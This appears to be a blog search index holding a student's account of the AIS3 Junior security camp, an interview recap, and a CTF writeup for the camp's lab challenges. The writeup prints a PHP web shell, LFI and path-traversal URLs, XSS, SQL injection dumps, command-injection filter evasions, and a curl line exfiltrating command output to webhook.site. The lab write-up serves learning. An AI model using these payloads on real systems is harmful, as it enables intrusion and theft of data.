<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AIS3 Junior 心得</title>
    <url>/AIS3-Junior/</url>
    <content><![CDATA[<hr>
<h3 id="前言">前言</h3>
<p>今年的 AIS3 Junior 舉辦在中正大學，課程共五天，也一樣有提供住宿及車票補助。超讚ㄉ<br>
我去年也曾參加 AIS3 Junior，不過因為當時是初次接觸資安，雖然最終有順利取得合格證書，但許多技術細節仍有些不熟悉。考量時間許可的情況下，我再次報名並順利被甄選錄取了！</p>
<hr>
<h3 id="住宿">住宿</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/dorm.png"
                      alt="image"
                ><br>
課程期間都是住在中正大學的學生宿舍(四人房)，要記得帶自己的拖鞋、枕頭、棉被、睡墊(很重要.ᐟ.ᐟ.ᐟ)、盥洗用品及吹風機等。裡面雖然有點老舊但還算乾淨，廁所也看得出來有重新裝修過，而且有乾濕分離。不過因為床板超硬，所以沒帶睡墊的話，根本睡不著而且因為床板老舊，翻身時還會有奇怪聲響。宿舍附近有超商和早餐店，半夜肚子餓的話可以去超商買消夜吃。不過課程所在的資訊大樓附近基本上就沒甚麼吃的了，除了活動中心那棟裡面有超商、貴貴的義大利麵和幾間學生餐廳外，其他吃的幾乎都要走出正門大概10分鐘左右才能找到。這幾天基本上不是跟助教、組員們一起吃，就是等回宿舍再去超商買或投販賣機。</p>
<hr>
<h3 id="Day-0">Day 0</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/register.png"
                      alt="image"
                ><br>
這天是課程中最輕鬆的一天，不過因為中正大學地理位置較偏僻，所以不論是搭高鐵或是臺鐵都要花上不少時間轉車。我是當天早上搭臺鐵到嘉義車站，在嘉義市區晃到下午再搭臺鐵到民雄車站，然後剛好在課程群組裡找到其他三人也要從民雄車站移動到中正大學，於是就四個人一起搭計程車去(跳表，車資220元)。抵達會場並報到後，安裝 Kali 環境、VPN 和認識助教及組員等。傍晚要從集合的圖書資訊大樓拖行李到宿舍，路途約15分鐘但半路突然突如其來的傾盆大雨讓我們的衣物、鞋子和行李都濕了。稍微整理後，我和助教及組員們一起吃附近的小火鍋。再次回到宿舍後，我和室友先解了幾題隔天上課的 Flag。</p>
<blockquote>
<p>本日睡眠時間： 01:30~07:00，約5.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-1">Day 1</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/CTF.png"
                      alt="image"
                ><br>
早上和助教及組員們一起吃完早餐後，拖著疲憊的身體前往資訊大樓開始一天的課程。早上的活動是開幕式和資安倫理課程，讓我們瞭解學習資安技術應具備的道德與責任。下午則進行破冰遊戲，需要根據提示並運用基礎資安概念解題，完成一定題數還有餅乾。隨後的資安概論課程聚焦於 Linux 指令的實際操作，基本上只要熟悉 Linux 大部分的 Flag 都不難找到。</p>
<blockquote>
<p>本日睡眠時間： 02:30~07:00，約4.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-2">Day 2</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/lecture.png"
                      alt="image"
                ><br>
今天主要的課程是由 <strong>徐牧遠(Red) 講師</strong> 帶來的網頁安全。我曾在去年的課程中學習過 Web Security，因此能跟上講師的節奏，也解出了不少進階題。晚上則安排了資安講座，邀請資安大佬 <strong>馬聖豪 前輩</strong>，分享自己從小透過撰寫遊戲外掛賺錢到參加第一屆 AIS3，最終在資安領域嶄露頭角的心路歷程。</p>
<blockquote>
<p>本日睡眠時間： 03:00~07:30，約4.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-3">Day 3</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/project.png"
                      alt="image"
                ><br>
最後一門課程是由 <strong>周佑康(Slash) 講師</strong> 帶來的 AI 應用安全實務。我覺得 AI 應用安全是個全新的體驗。因為我從未想過利用這些攻擊方法來影響人工智慧，取得可能混進訓練資料中的敏感資訊或在圖片中加入雜訊使神經網路辨認錯誤。講師從 LLM 的訓練原理講起，並介紹常見的大型語言模型及講解 Prompt Injection 這個攻擊方法。課後作業則是從講師提供的 AI 服務中取得機密資訊。此外，我們在這堂課中也學習了 CNN 辨識影像的原理，並學習攻擊方法 - Adversarial Attack，透過演算法在圖片中加入許多極小的雜訊，使神經網路無法正確辨識圖片。因為隔天就要發表專題了，所以我們今晚熬夜將作業的 writeup 完成並將專題推到一定進度後才去睡覺。</p>
<blockquote>
<p>本日睡眠時間： 04:30~07:00，約2.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-4">Day 4</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/report.png"
                      alt="image"
                ><br>
今天早上是最後的專題製作時間，我們這組的專題名稱是 「 原來 log 也可以寫 webshell !? 」 主要是透過 php 的 strcmp 函式漏洞 bypass 登入頁面，接著利用系統中的 LFI 漏洞實現 RCE。下午則是各組上台發表專題，讓其他組別的學員聆聽與學習的時間。從選定主題、漏洞復現到最終完成專題、上台分享時，那成就感不言而喻。雖然在處理環境時，我們遇到了不少問題，但一次次克服問題後，我們都會有更多的收穫。能將學到的知識與經驗分享給大家，也是一次非常寶貴的學習機會。</p>
<hr>
<h3 id="心得">心得</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/ending.png"
                      alt="image"
                ><br>
首先我要感謝 <strong>C組組員們</strong>、<strong>Kazma 助教</strong>和<strong>Sharon 助教</strong>，感謝你們在這幾天提供了我這麼多的幫助。雖然在專題中，我負責的是蒐集資料和尋找漏洞的防範方法，但對 php 不熟的我，光是搞懂基本語法就花了些時間。理解攻擊方法後尋找先例並思考有效的防範方法更是花了快一整晚。不過我們也順利在最後一天完成專題，並和組員們一起上台發表。參加這次課程，讓我認識了許多電神並對未來的學習有了明確方向，甚至有幸與 <strong>Kazma</strong>、<strong>Vincent</strong>、<strong>OsGa</strong> 等厲害的學長們同桌吃早餐真的是我沒有想到的。不過這也讓我意識到，自己在資安領域還有很多技術需要學習、探索。雖然目前的學習深度和廣度還不足以完全應對現實世界中的攻擊與威脅，但對未來繼續深入學習充滿了動力！沒意外的話，我未來應該也會往這方面升學吧！雖然很累，但學到新知識及技術的成就感，真的讓人有想要繼續研究下去的動力。<strong>To be a good hacker !</strong> 💪💪</p>
]]></content>
      <categories>
        <category>課程學習</category>
        <category>AIS3</category>
      </categories>
      <tags>
        <tag>課程</tag>
        <tag>AIS3</tag>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>國立宜蘭大學 特殊選才面試</title>
    <url>/NIU/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數： 2</li>
<li>面試時長：5 分鐘</li>
<li>報名人數：一般 48 / 資安 17</li>
<li>招生名額：一般⠀3 / 資安⠀3</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>宜蘭是我第三間面試的學校，到現在已經沒這麼緊張了。不過我原本以為資安組會針對資安知識或技術細節提問，沒想到教授們反而都在問我專案中和小論文遇到的困難與解決方式。整體來看，宜蘭的教授們似乎更重視實務經驗和未來的發展方向。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li><strong>教授：自我介紹</strong><br>
（略）</li>
<li><strong>教授：你有甚麼特別的資安經歷</strong><br>
（略）</li>
<li><strong>教授：在專案開發中遇到什麼困難？如何解決？</strong><br>
在開發 Discord Bot 時，就有遇到爬蟲程式報錯，但我不清楚是哪個部份出了問題。後來在 Stack Overflow 找到相關解法，發現問題出在該網站設有防爬蟲機制。我透過添加 User-Agent 解決這個問題。</li>
<li><strong>教授：你的小論文是如何進行的？</strong><br>
起初我們與指導老師反覆討論題目，最終決定以風力發電為題。我們針對風速、葉片數目及攻角角度三個變因進行實驗與數據分析，最後找出了最佳的配置方式以提升發電效率。</li>
<li><strong>教授：那你們的發電效率比現行的風力發電機更好嗎？</strong><br>
因為我們使用的是實驗室中的現成風力發電機組，與現行大型風力發電機不同，因此能源轉換率無法超越實際情況，不過我們研究出了最佳的效率配置情況。</li>
<li><strong>教授：你學過機器學習與人工智慧，也具備一定的資安能力。你認為可以如何結合兩者？</strong><br>
我認為可以透過機器學習訓練垃圾、釣魚郵件的模型，讓系統能自動辨識並阻擋釣魚信件，降低點擊到惡意連結的風險。</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 Junior writeup</title>
    <url>/AIS3-Junior-writeup/</url>
    <content><![CDATA[<hr>
<h2 id="01-Broken-Access-Control">01 - Broken Access Control</h2>
<h3 id="BAC-01">BAC 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>進入網頁後，有個輸入框問你是誰 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>隨便輸入幾個名字，發現都是進入 <code>user</code> 這個路徑，並輸出 <code>Welcome {name}！</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>嘗試更改路徑到 <code>admin</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{FirstBROKENAccessControl;)}</code></p>

  </div>
<h3 id="BAC-02">BAC 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>進入網頁後，可以看出他是個購物網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>將四樣商品點開，發現他們都是在 <code>product</code> 目錄下，依序為第 <code>1</code>、<code>2</code>、<code>3</code>、<code>5</code>、<code>6</code>項 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>更改網址，看看沒擺出來的 <code>編號4商品</code><br>
結果竟然是在賣 FLAG，而且還不用錢！ <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-3.png"
                      alt="image"
                > <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-4.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{BroJustFoundBabyIDORVulnerability}</code></p>

  </div>
<h3 id="BAC-03">BAC 03</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>類似 BAC01 的頁面，不過前面的方法對它沒用 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC03-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>嘗試利用 Burpsuite 攔截封包，結果發現程式碼內有 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC03-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{BabyBRokenAccEssControoooooool}</code></p>

  </div>
<h2 id="02-File-Upload">02 - File Upload</h2>
<h3 id="FIL-01">FIL 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>一個可以上傳東西的網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>甚至可以上傳包含 <code>&lt;?php system($_GET['cmd']);?&gt;</code> 的 web shell <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>上傳完成後，進入 <code>url/uploads/c3644_108.160.138.201.php</code><br>
在網址後方接上 <code>?cmd={command}</code> ，其中 <code>{command}</code> 可以插入任意指令</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p><code>ls</code> 發現這層目錄好像沒甚麼東西，<br>
到前一層目錄看看 (<code>{command}</code>=<code>ls%20../</code>)<br>
發現 FLAG 並印出 (<code>{command}</code>=<code>cat%20../FLAG</code>)</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{FirstWEBSHELLXDDD}</code></p>

  </div>
<h3 id="FIL-02">FIL 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>與上一題類似的網頁，但它似乎不給上傳 php 檔 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>將檔案類型改為 <code>image/jpg</code>，並送出修改過的封包內容<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>檔案上傳後，使用與前面一樣的方法，進入 <code>url/uploads/c3644_108.160.138.201.php</code>。結果發現前一層目錄中也有 FLAG 存在，將其印出即可得到答案<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{BabyUploadBypass}</code></p>

  </div>
<h2 id="03-Local-File-Inclusion">03 - Local File Inclusion</h2>
<h3 id="LFI-01">LFI 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>一個登錄系統和一張貓咪圖片 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>該圖片網址為 <code>url/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg</code> ，可以判斷這張圖片是透過 php 存取的</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>透過 php 偽協議 <code>php://filter/read=convert.base64-encode/resource=index.php</code>，可以將 <code>index.php</code> 的內容以 base64 編碼的方式讀取，解碼後即可還原出完整原始碼</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>發現管理員 帳號: <code>admin</code> 、 密碼: <code>CATLOVEBITCOINMEOWMEOW</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>登入管理員帳號後，即可得到 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}</code></p>

  </div>
<h3 id="LFI-02">LFI 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>檔案上傳後，存在 <code>/tmp/c3644_108.160.138.201.php</code> 中 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>先回到根目錄後並嘗試進入該目錄 <code>url/post.php?form=/../../../../../../tmp/c3644_108.160.138.201.php</code></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>接上指令 <code>&amp;cmd=ls</code>，查看目錄中檔案 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body danger">
    <p>使用 <code>&amp;cmd={command}</code>，而非  <code>?cmd={command}</code> 原因是前面已使用過 <code>.php?form=</code>，而我們還需要再接上額外指令，所以將其它的指令用 <code>&amp;</code> 連接</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>接上指令 <code>&amp;cmd=cat%20S3Cr3TFLAGGGGG</code>，查看 <code>S3Cr3TFLAGGGGG</code> 內容 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}</code></p>

  </div>
<h2 id="04-Cross-Site-Scripting">04 - Cross-Site Scripting</h2>
<h3 id="XSS-01">XSS 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>這個系統會問你是誰 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/XSS01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>發現原始碼中有 FLAG 這個變數 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/XSS01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>在輸入框中，輸入 <code>&lt;script&gt;alert(FLAG)&lt;/script&gt;</code> 即可取得 FLAG</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{XSSXSSXSSXSS}</code></p>

  </div>
<h2 id="05-Command-Injection">05 - Command Injection</h2>
<h3 id="CMD-01">CMD 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>這個網頁可以確認 IP 狀態 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>在輸入的 IP 後接上指令。如 <code>;ls -al</code>，顯示如下 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>看看 FLAG 裡面存著甚麼 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{BabyCommand;InjectionXDDDddddd}</code></p>

  </div>
<h3 id="CMD-02">CMD 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>這與上一題類似的網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>嘗試使用一樣的指令，但 <code>ls</code> 似乎被加進黑名單了 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>不過沒關係，我們可以利用 Spilt Evasion，將 <code>ls</code> 寫成 <code>l$()s</code>，插入後發現指令可以執行了！</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>輸入 <code>;c$()at FLAG</code>，取得 FLAG 的內容 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{niceWordBL$()ACKListEvasion;)}</code></p>

  </div>
<h3 id="CMD-03">CMD 03</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>與前兩題類似，但 <code>分號</code>、<code>空格</code> 等字元似乎被加進黑名單過濾了</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body danger">
    <p>不過沒關係，我們可以透過 Blacklist Evasion 繞過黑名單過濾機制。</p>

  </div>
<table>
<thead>
<tr>
<th style="text-align:center">逃脫方法</th>
<th style="text-align:center">原始字元</th>
<th style="text-align:center">逃脫方式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>Spilt Evasion</strong></td>
<td style="text-align:center"><code>cat</code></td>
<td style="text-align:center"><code>c$()at</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>Bash Operator</strong></td>
<td style="text-align:center"><code>;</code></td>
<td style="text-align:center"><code>|</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>Space Evasion</strong></td>
<td style="text-align:center"><code>空格</code></td>
<td style="text-align:center"><code>$&#123;IFS&#125;</code></td>
</tr>
</tbody>
</table>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>將 <code>;cat FLAG</code> 改為輸入 <code>|c$()at${IFS}FLAG</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD03-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{BashOperato|rEvasion${IFS}SUCC|ESSFUL|:DDDDD}</code></p>

  </div>
<h3 id="CMD-04">CMD 04</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>雖然與前面幾題長很像，但先前的指令對這題沒用 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD04-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>束手無策，只好試試看用 webhook 能不能撈到些資訊</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>透過curl 將數據傳至 webhook，並利用前面手法繞過驗證<br>
<code>|cu$()rl${IFS}-X${IFS}POST${IFS}https://webhook.site/your_UUID${IFS}-d${IFS}out$()put=$(l$()s)</code><br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD04-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p><code>ls</code> 後，發現裡面有 <code>ERRORCMDi_FLAG</code> 檔案<br>
將 <code>ls</code> 改為 <code>cat ERRORCMDi_FLAG</code>，即可得到 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD04-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{E${IFS}RRORB3sed|$(CMDi)Succ3ss:DD}</code></p>

  </div>
<h3 id="CMD-05">CMD 05</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>與前一題類似，一樣先 <code>ls</code> 將資料夾檔案列出 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD05-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>同上題，將 <code>ls</code> 改為 <code>cat BLindCMDiFLAG</code>後，即可得到 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD05-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{BROJust|curl%20-d%20$(l3akTheDATAT0outSideXDD)}</code></p>

  </div>
<h3 id="CMD-06">CMD 06</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>同上題，輸入 <code>|c$()at${IFS}FLAG</code> 即可取得FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD06-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{ouo_hihi}</code></p>

  </div>
<h2 id="06-SQL-Injection">06 - SQL Injection</h2>
<h3 id="SQL-01">SQL 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>一個登入系統 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>在帳號欄位填入 <code>admin' or 1==1 -- #</code> ，將帳號設為 <code>admin</code> 並將後面判斷註解掉 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{SQL'InjectionXDorD=D_--_-}</code></p>

  </div>
<h3 id="SQL-02">SQL 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>一個有輸入框的頁面 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>隨意輸入後，會進到此頁面 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>可以使用 <code>UNION SELECT (num) #</code> 來測試查詢的有效欄位數，當 (num) 填入 <code>1</code>、<code>1,2</code>、<code>1,2,3</code> 時，系統都報錯了。<br>
而填入 <code>1,2,3,4</code> 時不再報錯，說明這個資料庫的查詢需要匹配四個欄位！<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>使用 <code>UNION SELECT</code> 搭配 <code>group_concat(schema_name)</code> 從 information_schema.schemata 中獲取所有資料庫名稱，<br>
<code>' UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-4.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>選定 ApexPredators 資料庫後，使用 <code>UNION SELECT</code> 及 <code>group_concat(table_name)</code> 從 information_schema.tables 中查詢該資料庫的所有表格名稱。<br>
<code>' UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables WHERE table_schema='ApexPredators' #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-5.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>確認表格後，我對 ApexPredators 資料庫中的 user 表格進行查詢，利用 WHERE table_name 篩選表格及查詢欄位名稱<br>
<code>' UNION SELECT 1,group_concat(column_name),3,4 from information_schema.columns WHERE table_schema='ApexPredators' AND table_name='users' #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-6.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>鎖定 ApexPredators.users 欄位，使用 <code>UNION SELECT 1,username,isAdmin,password</code> 提取帳號、密碼及是否為管理員等重要資訊<br>
<code>' UNION SELECT 1,username,isAdmin,password FROM ApexPredators.users #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-7.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>從提取的資料中發現用戶 KubenBlisk 是管理員，使用該帳號密碼後成功登入系統即可取得 FLAG<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-8.png"
                      alt="image"
                > <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-9.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{_BRO-DO_A--UNION_SELECTXDDD_--_-}</code></p>

  </div>
<h2 id="07-Server-Side-Template-Injection">07 - Server-Side Template Injection</h2>
<h3 id="STI-01">STI 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>有一個輸入框，輸入 <code>1+1</code> 會回傳2。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>利用<a class="link"   href="https://github.com/HHousen/hack-the-box/blob/master/Challenges/Web/Templated/README.md" >在網路上找到的payload<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>
